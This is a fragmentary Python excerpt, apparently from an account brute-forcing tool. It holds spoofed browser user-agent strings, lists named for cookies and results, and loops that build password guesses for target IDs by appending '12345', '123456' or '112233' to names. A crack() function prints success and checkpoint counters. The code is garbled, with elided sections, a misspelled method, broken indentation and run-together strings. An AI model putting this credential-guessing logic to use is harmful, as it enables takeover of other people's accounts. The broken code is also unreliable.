...
#USER-AGENTSMozilla/5.0 (Linux x86_64; en-US) Gecko/20130401 Firefox/66.17022177515Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36user-agent:Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36
ugen2=[]
ugen=[]
cokbrut=[]
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append("12345"+frs)
					pwv.append("123456"+frs)
pwv.appen("112233"+frs)			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
...
def crack(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r{x}[H𝗚𝗘𝗩𝗔𝗥𝗔x]{loop}{U}|{H}{ok}"),
	sys.stdout.flush()
